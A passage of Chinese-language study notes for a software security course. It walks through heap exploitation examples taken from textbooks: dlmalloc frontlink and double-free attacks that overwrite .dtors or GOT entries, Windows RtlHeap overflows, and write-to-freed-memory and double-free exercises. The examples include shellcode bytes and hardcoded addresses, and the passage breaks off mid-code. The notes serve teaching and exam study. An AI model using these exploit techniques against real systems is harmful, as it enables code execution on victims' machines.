<li>strcpy(fourth, argv[1])：其直接前驱内存块fourth被精心设计的数据所<strong>填满（argv[1]）</strong>，因此这里就发生了溢出。并且fifth的前向指针指向了一个<strong>假的内存块。</strong>这个假的内存块的后向指针的位置包含有<strong>一个函数指针的地址（假的内存+12，也就是后向）</strong>：一个合适的<strong>函数指针</strong>是存储于程序.dtors区中的第一个析构函数的地址。攻击者可以通过<strong>检查可执行映像</strong>而获得这个地址，一般就是前面指针讲到过的。</li>
<li>free(second)：当second块被释放时，程序使frontlink()代码段将其插入到与<strong>fifth块</strong>相同的筐中。</li>
<li>return(0)：对return(0)的调用，本来应该导致程序的<strong>析构函数被调用</strong>，而现在<strong>实际调用的却是shellcode。</strong></li>
</ul>
<p>frontlink代码片段</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">BK = bin;</span><br><span class="line">FD = BK-&gt;fd;</span><br><span class="line"><span class="keyword">if</span> (FD != BK) &#123;</span><br><span class="line"><span class="keyword">while</span> (FD != BK &amp;&amp; S &lt; chunksize(FD)) &#123; </span><br><span class="line">FD = FD-&gt;fd; </span><br><span class="line">&#125;</span><br><span class="line">BK = FD-&gt;bk;</span><br><span class="line">&#125;</span><br><span class="line">P-&gt;bk = BK;</span><br><span class="line">P-&gt;fd = FD;</span><br><span class="line">FD-&gt;bk = BK-&gt;fd = P</span><br></pre></td></tr></table></figure>

<ul>
<li>while (FD !&#x3D; BK &amp;&amp; S &lt; chunksize(FD)) ：<strong>second比fifth内存块小</strong>，frontlink()代码段中的while循环得以执行。</li>
<li>FD &#x3D; FD-&gt;fd：fifth块的前向指针被存储到FD中，<strong>这是一个假地址，</strong>他的后向，也就是+12的地方是类似.dtors函数位置。</li>
<li>BK &#x3D; FD-&gt;bk：<strong>找到的FD是假地址</strong>（比如.dtors中指针的前12个字节），而此处循环的BK原本应该就是第5块的，但是这里做了精心处理，变成了包含函数地址（此处是.dtors相关）的一个地址了。此处用second来覆盖.dtors地址，而second为first覆盖，指向的是first中的shellcode。前向的后向指向second，这样就替换了假地址的后向，也就是改变了.dtors的值。</li>
<li>FD-&gt;bk &#x3D; BK-&gt;fd &#x3D; P：现在BK包含有函数指针的地址（指针值减8），函数指针<strong>被second块的地址所覆写。</strong></li>
<li>当frontlink()执行完毕后，second块的前向指针和后向指针都分别指向<strong>函数指针。</strong></li>
</ul>
<p>6.双重释放漏洞（考了n次）</p>
<p>（1）这种类型的漏洞是由于对同一块内存释放两次所造成的<strong>（在这两次释放之间没有对内存进行重新分配，</strong>被释放的内存块相邻的内存块必须<strong>已分配）</strong><br>（2）要成功地利用双重释放漏洞，有两个条件必须满足：<strong>被释放的内存块必须在内存中独立存在、该内存所被放入的筐（bin）必须为空。</strong></p>
<p>（3）一个空的筐和一个已分配的内存块：空的筐<strong>仅仅包含头</strong>，筐和内存块之间没有任何联系。</p>
<p>（4）块被释放后，它被放入筐中：在调用frontlink后，筐的前向和后向指针指向已释放的块</p>
<p>（5）对内存块的第二次释放毁坏了筐结构：frontlink</p>
<p>（6）该漏洞可被利用的进一步说明：技术是困难的，<strong>已释放的内存没有立即放入筐中</strong>，而是被缓存。双重释放块可能和其他块合并。</p>
<p>练习题：</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">static</span> <span class="type">char</span> *GOT_LOCATION = (<span class="type">char</span> *)<span class="number">0x0804c98c</span>;</span><br><span class="line"><span class="type">static</span> <span class="type">char</span> shellcode[] =</span><br><span class="line"><span class="string">&quot;\xeb\x0cjump12chars_&quot;</span> <span class="comment">/* jump */</span></span><br><span class="line"><span class="string">&quot;\x90\x90\x90\x90\x90\x90\x90\x90&quot;</span></span><br><span class="line"></span><br><span class="line"><span class="type">int</span> main(<span class="type">void</span>)&#123;</span><br><span class="line"><span class="type">int</span> size = <span class="keyword">sizeof</span>(shellcode);</span><br><span class="line"><span class="type">void</span> *shellcode_location;</span><br><span class="line"><span class="type">void</span> *first, *second, *third, *fourth;</span><br><span class="line"><span class="type">void</span> *fifth, *sixth, *seventh;</span><br><span class="line">shellcode_location = (<span class="type">void</span> *)<span class="built_in">malloc</span>(size);</span><br><span class="line"><span class="built_in">strcpy</span>(shellcode_location, shellcode);</span><br><span class="line">first = (<span class="type">void</span> *)<span class="built_in">malloc</span>(<span class="number">256</span>); </span><br><span class="line">second = (<span class="type">void</span> *)<span class="built_in">malloc</span>(<span class="number">256</span>);</span><br><span class="line">third = (<span class="type">void</span> *)<span class="built_in">malloc</span>(<span class="number">256</span>);</span><br><span class="line">fourth = (<span class="type">void</span> *)<span class="built_in">malloc</span>(<span class="number">256</span>); </span><br><span class="line"><span class="built_in">free</span>(first); </span><br><span class="line"><span class="built_in">free</span>(third); </span><br><span class="line">fifth = (<span class="type">void</span> *)<span class="built_in">malloc</span>(<span class="number">128</span>); </span><br><span class="line"><span class="built_in">free</span>(first);</span><br><span class="line">sixth = (<span class="type">void</span> *)<span class="built_in">malloc</span>(<span class="number">256</span>);</span><br><span class="line">*((<span class="type">void</span> **)(sixth+<span class="number">0</span>))=(<span class="type">void</span> *)(GOT_LOCATION<span class="number">-12</span>);</span><br><span class="line">*((<span class="type">void</span> **)(sixth+<span class="number">4</span>))=(<span class="type">void</span> *)shellcode_location;</span><br><span class="line">seventh = (<span class="type">void</span> *)<span class="built_in">malloc</span>(<span class="number">256</span>); </span><br><span class="line"><span class="built_in">strcpy</span>(fifth, <span class="string">&quot;something&quot;</span>);</span><br><span class="line"><span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<ul>
<li>first &#x3D; (void *)malloc(256)：利用方式的目标是分配的first块</li>
<li>second &#x3D; (void *)malloc(256);third &#x3D; (void <em>)malloc(256);fourth &#x3D; (void <em>)malloc(256)：对second和fourth块的分配，**可以阻止third块与first块合并。</em></em></li>
<li>free(first)：当first块在初次释放时，<strong>会被放入缓存筐而不是普通筐。</strong></li>
<li>free(third)：释放third块<strong>将first块移到普通筐。</strong></li>
<li>fifth &#x3D; (void <em>)malloc(128)：分配fifth块<strong>会造成内存从third块处分开</strong>，一部分<strong>分配了</strong>，另一部分*<em>还在筐中。</em></em></li>
<li>free(first)：内存已经配置成功，因此对first的<strong>第二次释放构成双重释放漏洞。</strong></li>
<li>sixth &#x3D; (void <em>)malloc(256)：<strong>分配sixth块时，</strong>malloc()返回的指针*<em>与first所指向的内存块相同。</em></em></li>
<li>*((void <em>*)(sixth+0))&#x3D;(void *)(GOT_LOCATION-12)：在被释放后，**写入到first块。</em>*</li>
<li>*((void <em>*)(sixth+4))&#x3D;(void *)shellcode_location：strcpy()函数的GOT地址（减去1）以及shellcode位置**被复制到这块内存（first块）。</em>*</li>
<li>seventh &#x3D; (void <em>)malloc(256)：相同的内存块被<strong>再一次分配给seventh块。</strong>当内存块被分配后，unlink()宏将shellcode的地址*<em>复制到全局偏移表中strcpy的地址处。</em></em></li>
<li>strcpy(fifth, “something”)：<strong>调用strcpy()时，</strong>程序的控制权被转移到shellcode中。shellcode跳过最初的12个字节，因为这部分内存的一些已经被unlink()宏所覆写。</li>
</ul>
<p>双重释放漏洞很难利用，但是在现实世界中已经被成功利用过。写入到已释放内存也是安全缺陷。</p>
<p><img src="data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="/2026/01/06/%E8%BD%AF%E4%BB%B6%E5%AE%89%E5%85%A8%E6%AF%94%E8%BE%83%E9%87%8D%E8%A6%81%E7%9A%84%E5%9C%B0%E6%96%B9/image%2062.png" alt="image.png"></p>
<h3 id="RTL堆"><a href="#RTL堆" class="headerlink" title="RTL堆"></a>RTL堆</h3><p>1.Windows内存管理</p>
<p><strong>（1）虚拟内存API：32位</strong>地址，4KB<strong>页</strong>，用户地址空间分区域（保护方式、类型以及每页的基分配方式）</p>
<p><strong>（2）堆内存API：</strong>允许用户建立多个动态堆，每一个进程都有一个默认堆。</p>
<p>2.RTL堆</p>
<p>（1）使用<strong>虚拟内存API</strong>，实现了<strong>更高级的局部、全局和CRT内存函数。</strong></p>
<p>（2）内存管理API的错误使用可能导致软件漏洞。需要理解的RTL数据结构：<strong>进程环境块、空闲链表、look-aside链表、内存块的结构</strong></p>
<p>①进程环境块：<strong>PEB维护有每一个进程的全局变量</strong>，PEB被每一个进程的<strong>线程环境块（TEB）所引用</strong>，TEB<strong>则被fs寄存器所引用。</strong></p>
<p>PEB给出<strong>堆数据结构</strong>的信息：<strong>堆的最大数量、堆的实际数量、默认堆的位置、一个指向包含所有堆位置的数组的指针。</strong></p>
<p><img src="data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="/2026/01/06/%E8%BD%AF%E4%BB%B6%E5%AE%89%E5%85%A8%E6%AF%94%E8%BE%83%E9%87%8D%E8%A6%81%E7%9A%84%E5%9C%B0%E6%96%B9/image%2063.png" alt="image.png"></p>
<p>②<strong>空闲链表</strong>：<strong>有128个双向链表</strong>的数组。位于堆起始（也就是调用HeapCreate（）返回的地址）偏移0x178处，这个链表被RtlHeap用来跟踪空闲内存块。</p>
<p>Freelist[]是一个LIST_ENTRY结构的数组，每一个LIST_ENTRY表示一个双链表的头部。LIST_ENTRY结构定义于winnt.b中，<strong>由一个前向链接（flink）和一个后向链接（blink）组成。</strong></p>
<p>以下图考试练习题有：</p>
<p><img src="data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="/2026/01/06/%E8%BD%AF%E4%BB%B6%E5%AE%89%E5%85%A8%E6%AF%94%E8%BE%83%E9%87%8D%E8%A6%81%E7%9A%84%E5%9C%B0%E6%96%B9/image%2064.png" alt="image.png"></p>
<ul>
<li>链表中的空闲块<strong>从最小到最大排序</strong>，该数据结构所代表的堆包含有<strong>8个空闲块</strong>：其中有2个空闲块是16字节长，由存储于Freelist[2]中的链表维护，另外的两个48字节长的空闲块由Freelist[6]所维护。</li>
<li><strong>块大小等于表格行索引乘以8个字节（Freelist[0]除外）。</strong></li>
<li>块大小与空闲链表在数组中的位置之间的关系均得到了维护。最后的4个空闲块大小分别为1400、2000、2000和2408字节，它们都比1024大，<strong>因此都由Freelist[0]维护，</strong>并且<strong>按大小升序排列</strong>。当创建一个<strong>新堆</strong>时，<strong>空闲链表被初始化为空。</strong>当链表为空时，<strong>前向和后向链接都指向链表头。</strong></li>
<li>页中未作为第一个内存块的一部分而分配出去的内存，以及那些没有被用作堆控制结构的内存，就被加入空闲列表。对于较小的分配（指的是小于1472字节），<strong>大于1024的被加入到Freelist[0]中。</strong>假设空间足够的话，后续的分配都从这个空闲块中进行。</li>
</ul>
<p><strong>③后备缓存链表</strong></p>
<ul>
<li>在堆分配时创建，用于<strong>加速对小块内存（这里指的是小于1016字节）的分配操作。</strong>后备缓存链表一开始被<strong>初始化为空链表，</strong>然后随着内存被释放而增长。后备缓存链表会<strong>先于空闲链表被检查</strong>。</li>
</ul>
<p><img src="data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="/2026/01/06/%E8%BD%AF%E4%BB%B6%E5%AE%89%E5%85%A8%E6%AF%94%E8%BE%83%E9%87%8D%E8%A6%81%E7%9A%84%E5%9C%B0%E6%96%B9/image%2065.png" alt="image.png"></p>
<ul>
<li>后备缓存链表中的<strong>空闲块的数量会被自动调整</strong>：根据特定大小内存块的分配频率。一个特定大小的内存<strong>被分配得越频繁</strong>，在相应链表中<strong>存储该大小的内存块的数量就越多，</strong>对后备缓存链表的使用使得小块内存的分配速度加快。</li>
</ul>
<p>3.边界标志</p>
<p><strong>（1）调用HeapAlloc()或malloc()所返回的。</strong>这个结构位于HeapAlloc()所返回的地址<strong>之前</strong>，<strong>偏移量为8个字节</strong>。包含：<strong>自身大小、前一块大小、busy标志位、传统的部分。</strong></p>
<p><img src="data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="/2026/01/06/%E8%BD%AF%E4%BB%B6%E5%AE%89%E5%85%A8%E6%AF%94%E8%BE%83%E9%87%8D%E8%A6%81%E7%9A%84%E5%9C%B0%E6%96%B9/image%2066.png" alt="image.png"></p>
<p>（2）当块<strong>被释放</strong>时：<strong>边界标志仍然存在，空闲内存包含下一块和上一块地址，busy标志位被清空。</strong></p>
<p><img src="data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="/2026/01/06/%E8%BD%AF%E4%BB%B6%E5%AE%89%E5%85%A8%E6%AF%94%E8%BE%83%E9%87%8D%E8%A6%81%E7%9A%84%E5%9C%B0%E6%96%B9/image%2067.png" alt="image.png"></p>
<p>4.基于堆的缓冲区溢出攻击：通常需要<strong>改写双链表结构中的前向和后向指针。</strong>正常的堆处理过程覆写地址，从而修改程序的执行流程。</p>
<p>练习题有此代码题：发生缓冲区溢出时，h2的<strong>前向指针</strong>被覆写为0012f5b8，<strong>后向指针</strong>被覆写为00409040。</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">unsigned</span> <span class="type">char</span> shellcode[] = <span class="string">&quot;\x90\x90\x90\x90&quot;</span>;</span><br><span class="line"><span class="type">unsigned</span> <span class="type">char</span> malArg[] = <span class="string">&quot;0123456789012345&quot;</span></span><br><span class="line"><span class="string">&quot;\x05\x00\x03\x00\x00\x00\x08\x00&quot;</span> <span class="comment">// 8字节小端整数（可能是长度，标志）</span></span><br><span class="line">**<span class="string">&quot;\xb8\xf5\x12\x00\x40\x90\x40\x00&quot;</span>;** <span class="comment">// 8字节，要写入的指针值</span></span><br><span class="line"><span class="type">void</span> <span class="title function_">mem</span><span class="params">()</span> &#123;</span><br><span class="line">HANDLE hp;</span><br><span class="line">HLOCAL h1 = <span class="number">0</span>, h2 = <span class="number">0</span>, h3 = <span class="number">0</span>, h4 = <span class="number">0</span>;</span><br><span class="line">hp = HeapCreate(<span class="number">0</span>, <span class="number">0x1000</span>, <span class="number">0x10000</span>); <span class="comment">// 第6行，创建新堆</span></span><br><span class="line">h1 = HeapAlloc(hp, HEAP_ZERO_MEMORY, <span class="number">16</span>);</span><br><span class="line">h2 = HeapAlloc(hp, HEAP_ZERO_MEMORY, <span class="number">128</span>);</span><br><span class="line">h3 = HeapAlloc(hp, HEAP_ZERO_MEMORY, <span class="number">16</span>);</span><br><span class="line">HeapFree(hp,<span class="number">0</span>,h2); <span class="comment">// 第10行，释放h2导致在已分配内存中打开了一个缺口</span></span><br><span class="line"><span class="built_in">memcpy</span>(h1, malArg, <span class="number">32</span>); <span class="comment">// h1只有16字节，但复制了32字节，发生缓冲区溢出</span></span><br><span class="line">h4 = HeapAlloc(hp, HEAP_ZERO_MEMORY, <span class="number">128</span>); </span><br><span class="line"><span class="comment">// 引发返回地址被shellcode地址覆写</span></span><br><span class="line"><span class="comment">// 对HeapAlloc()的调用会导致shellcode的起始4个字节被返回地址\xb8\xf5\x12\x00所覆盖地址需要可被执行！</span></span><br><span class="line"><span class="keyword">return</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="type">int</span> _tmain(<span class="type">int</span> argc, _TCHAR* argv[]) &#123;</span><br><span class="line">mem();</span><br><span class="line"><span class="keyword">return</span> <span class="number">0</span>; <span class="comment">// 控制转移到shellcode</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>（1）第6行调用Heapcreate()创建了一个新的堆，<strong>初始大小为0x1000，最大大小0x10000。</strong>建立一个新堆简化了利用，因为我们知道堆中的确切内容。第7~9行<strong>分配了3个不同大小的内存块。</strong>这些内存块的<strong>空间是连续的，</strong>因此时<strong>没有合适大小的空闲块可用。</strong></p>
<p>（2）第10行<strong>释放h2</strong>导致<strong>在已分配内在中打开了一个缺口</strong>。这个内存块<strong>被加入空闲链表中</strong>，意味着<strong>其起始8个字节被用指向空闲链表头部的前向和后向指针改写，且busy标志位也被清空。</strong>从h1开始，内存按照如下方式排列：<strong>h1块、空闲块和h3块</strong>。</p>
<p>（3）在本示例利用代码第11行的<strong>缓冲区溢出</strong>发生处，我们没有做任何掩饰性的工作。在这个memcpy()操作中，malArg的起始16个字节<strong>覆写了用户数据区域</strong>。接下来的8个字节<strong>覆写了空闲块的这个标志</strong>。在本例中，利用代码只是保留了现有的信息，因此接下来的正常操作未受影响。malArg接下来的8个字节<strong>覆盖了指向下一个和上一个块的指针。</strong>下一个块的地址被将<strong>被覆写的地址所覆盖</strong>（在本例中是栈中的一个返回地址）。上一个块的地址被<strong>shellcode的地址</strong>所覆写。</p>
<p>（4）现在第12行调用HeapAlloc()所需要的舞台都已搭建完毕，调用发生后，<strong>程序的返回地址将被shellcode的地址覆盖。</strong>之所以如此，是因为对HeapAlloc()的这次调用<strong>所请求的字节数与上一个空闲块大小相同。</strong>结果，RtlHeap从包含受害块的空闲链表中取得了内存块。当空闲块从空闲双链表中移出时，返回地址就被改写成了shellcode的地址。</p>
<p>（5）当mem()函数<strong>在第17行</strong>返回时，<strong>程序的控制权就转移给shellcode。</strong></p>
<p>5.更容易的方法：<strong>通过覆写异常处理器地址获取控制、引发异常</strong></p>
<p>练习题：</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">int</span> <span class="title function_">mem</span><span class="params">(<span class="type">char</span> *buf)</span> &#123;</span><br><span class="line">HLOCAL h1 = <span class="number">0</span>, h2 = <span class="number">0</span>;</span><br><span class="line">HANDLE hp;</span><br><span class="line">hp = HeapCreate(<span class="number">0</span>, <span class="number">0x1000</span>, <span class="number">0x10000</span>); <span class="comment">// 创建堆</span></span><br><span class="line"><span class="keyword">if</span> (!hp) <span class="keyword">return</span> <span class="number">-1</span>;</span><br><span class="line">h1 = HeapAlloc(hp, HEAP_ZERO_MEMORY, <span class="number">260</span>);</span><br><span class="line"><span class="built_in">strcpy</span>((<span class="type">char</span> *)h1, buf); </span><br><span class="line">h2 = HeapAlloc(hp, HEAP_ZERO_MEMORY, <span class="number">260</span>);</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;we never get here&quot;</span>);</span><br><span class="line"><span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="type">int</span> <span class="title function_">main</span><span class="params">(<span class="type">int</span> argc, <span class="type">char</span> *argv[])</span> &#123;</span><br><span class="line">HMODULE l;</span><br><span class="line">l = LoadLibrary(<span class="string">&quot;wmvcore.dll&quot;</span>);</span><br><span class="line">buildMalArg();</span><br><span class="line">mem(buffer); <span class="comment">// 基于堆的缓冲区溢出</span></span><br><span class="line"><span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>第一次调用HeapAlloc()后的堆的组织形式：</p>
<p><img src="data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="/2026/01/06/%E8%BD%AF%E4%BB%B6%E5%AE%89%E5%85%A8%E6%AF%94%E8%BE%83%E9%87%8D%E8%A6%81%E7%9A%84%E5%9C%B0%E6%96%B9/7d97ae78-d46b-4b4d-b1a2-50611c33c3ed.png" alt="image.png"></p>
<ul>
<li>h1 &#x3D; HeapAlloc(hp, HEAP_ZERO_MEMORY, 260)：分配了一个单独的内存块堆，包括：段头为h1所分配的<strong>内存段尾。</strong>变量h1指向0x00ba0688，这也是<strong>用户内存的起始地址</strong>。</li>
<li>strcpy((char *)h1, buf)：堆溢出：覆写<strong>段尾</strong>，包括<strong>LIST_Entry结构指针。</strong>很可能在下一个对RtlHeap的调用时被引用。这会触发一个异常。</li>
<li>第一次调用HeapAlloc()后，指向Freelist[0]的前向指针(flink)和后向指针(blink)的地址分别是<strong>0x00ba0798</strong>和<strong>0x00ba079c</strong>，这些指针可以通过<strong>对strcpy()的调用</strong>被覆写。</li>
</ul>
<p>6.RTL Heap</p>
<p>练习题：</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">char</span> buffer[<span class="number">1000</span>]=<span class="string">&quot;&quot;</span>;</span><br><span class="line"><span class="type">void</span> <span class="title function_">buildMalArg</span><span class="params">()</span> &#123;</span><br><span class="line"><span class="type">int</span> addr = <span class="number">0</span>, i = <span class="number">0</span>;</span><br><span class="line"><span class="type">unsigned</span> <span class="type">int</span> systemAddr = <span class="number">0</span>;</span><br><span class="line"><span class="type">char</span> tmp[<span class="number">8</span>]=<span class="string">&quot;&quot;</span>;</span><br><span class="line">systemAddr = GetAddress(<span class="string">&quot;msvcrt.dll&quot;</span>,<span class="string">&quot;system&quot;</span>);</span><br><span class="line"><span class="keyword">for</span> (i=<span class="number">0</span>; i &lt; <span class="number">66</span>; i++) <span class="built_in">strcat</span>(buffer, <span class="string">&quot;DDDD&quot;</span>);</span><br><span class="line"><span class="built_in">strcat</span>(buffer, <span class="string">&quot;\xeb\x14&quot;</span>);</span><br><span class="line"><span class="built_in">strcat</span>(buffer, <span class="string">&quot;\x44\x44\x44\x44\x44\x44&quot;</span>); </span><br><span class="line"><span class="built_in">strcat</span>(buffer, <span class="string">&quot;\x73\x68\x68\x08&quot;</span>);</span><br><span class="line"><span class="built_in">strcat</span>(buffer, <span class="string">&quot;\x4c\x04\x5d\x7c&quot;</span>); </span><br><span class="line"><span class="keyword">for</span> (i=<span class="number">0</span>; i &lt; <span class="number">21</span>; i++) <span class="built_in">strcat</span>(buffer,<span class="string">&quot;\x90&quot;</span>);</span><br><span class="line">strat(buffer, <span class="string">&quot;\x33\xC0\x50\x68\x63\x61\x6C\x63\x54\x5B\x50\x53\xB9&quot;</span>);</span><br><span class="line">fixupaddresses(tmp, systemAddr);</span><br><span class="line"><span class="built_in">strcat</span>(buffer,tmp);</span><br><span class="line"><span class="built_in">strcat</span>(buffer,<span class="string">&quot;\xFF\xD1\x90\x90&quot;</span>);</span><br><span class="line"><span class="keyword">return</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<ul>
<li>strcat(buffer, “\x73\x68\x68\x08”)：前向指针被<strong>控制权将要转移到的地址</strong>所取代<strong>。</strong></li>
<li>strcat(buffer, “\x4c\x04\x5d\x7c”)：（这两行代码，<strong>10和11行</strong>）<strong>改写了尾随空闲块的前向和后向指针</strong>。后向指针则被将要<strong>被覆写的内存地址</strong>所取代。</li>
<li>strat(buffer, “\x33\xC0\x50\x68\x63\x61\x6C\x63\x54\x5B\x50\x53\xB9”)：偏移量会<strong>覆写尾随的空闲块的后向指针</strong>，因此缓冲区<strong>控制转移到用户提供的地址</strong>，而不是<strong>未处理的异常处理器。</strong></li>
<li><strong>用来覆盖前向指针的地址就是shellcode的地址</strong>，因为RtlHeap接下来会改写shellcode的起始4个字节，对于攻击者而言，更容易的办法应该是<strong>采用一个跳板</strong>。跳板允许在事先不知道shellcode的绝对地址的情况下<strong>将程序的控制权转移到shellcode处</strong>。跳板可以通过<strong>检查程序的映像或动态链接库</strong>进行定位，也可以通过<strong>加载库并搜索内存</strong>来动态地定位。</li>
<li>RTL堆可能存在漏洞：<strong>写入已释放内存、双重释放、Look-Aside表</strong></li>
</ul>
<p>考试练习题：</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// RTLHeap：写入已释放内存</span></span><br><span class="line"><span class="keyword">typedef</span> <span class="class"><span class="keyword">struct</span> _<span class="title">unalloc</span> &#123;</span></span><br><span class="line">PVOID fp;</span><br><span class="line">PVOID bp;</span><br><span class="line">&#125; unalloc, *Punalloc;</span><br><span class="line"><span class="type">char</span> shellcode[] = <span class="string">&quot;\x90\x90\x90\xb0\x06\x90\x90&quot;</span>;</span><br><span class="line"><span class="type">int</span> _tmain(<span class="type">int</span> argc, _TCHAR* argv[]) &#123;</span><br><span class="line">Punalloc h1;</span><br><span class="line">HLOCAL h2 = <span class="number">0</span>;</span><br><span class="line">HANDLE hp; <span class="comment">// 创建堆</span></span><br><span class="line">hp = HeapCreate(<span class="number">0</span>, <span class="number">0x1000</span>, <span class="number">0x10000</span>);</span><br><span class="line">h1 = (Punalloc)HeapAlloc(hp, HEAP_ZERO_MEMORY, <span class="number">32</span>);  <span class="comment">// 从该堆中分配了一个32字节的内存块，用h1表示</span></span><br><span class="line">HeapFree(hp, <span class="number">0</span>, h1); <span class="comment">// 错误地释放</span></span><br><span class="line">h1-&gt;fp = (PVOID)(<span class="number">0x042B17C</span> - <span class="number">4</span>); <span class="comment">// 用户数据则被错误地写入已释放内存块中</span></span><br><span class="line">h1-&gt;bp = shellcode; </span><br><span class="line">h2 = HeapAlloc(hp, HEAP_ZERO_MEMORY, <span class="number">32</span>); </span><br><span class="line">HeapFree(hp, <span class="number">0</span>, h2); <span class="comment">// 控制转移到shellcode</span></span><br><span class="line"><span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<ul>
<li>代码中所包含的RTL堆漏洞是<strong>写入已释放的内存</strong>。</li>
<li>h2 &#x3D; HeapAlloc(hp, HEAP_ZERO_MEMORY, 32)：对HeapAlloc()的调用使得<strong>HeapFree()的地址</strong>被shellcode的地址所覆盖。</li>
<li>当释放h1时，它被放入一个空闲块大小为32字节的空闲列表中。在空闲列表中可使用的内存块的第一个双字<strong>保存有指向链表中下一个内存块的前向指针，</strong>第二个双字<strong>保存有后向指针。</strong>前向指针<strong>被待改写的地址所取代</strong>，后向指针<strong>则被shellcode的地址所覆盖。</strong></li>
</ul>
<p>练习题：</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// RTLHeap: 双重释放</span></span><br><span class="line"><span class="type">int</span> <span class="title function_">main</span><span class="params">(<span class="type">int</span> argc, <span class="type">char</span> *argv[])</span> &#123;</span><br><span class="line">HANDLE hp;</span><br><span class="line">HLOCAL h1, h2, h3, h4, h5, h6, h7, h8, h9;</span><br><span class="line">hp = HeapCreate(<span class="number">0</span>,<span class="number">0x1000</span>,<span class="number">0x10000</span>);</span><br><span class="line">h1 = HeapAlloc(hp, HEAP_ZERO_MEMORY, <span class="number">16</span>); <span class="comment">// 内存分配块1</span></span><br><span class="line"><span class="built_in">memset</span>(h1, <span class="string">&#x27;a&#x27;</span>, <span class="number">16</span>);</span><br><span class="line">h2 = HeapAlloc(hp, HEAP_ZERO_MEMORY, <span 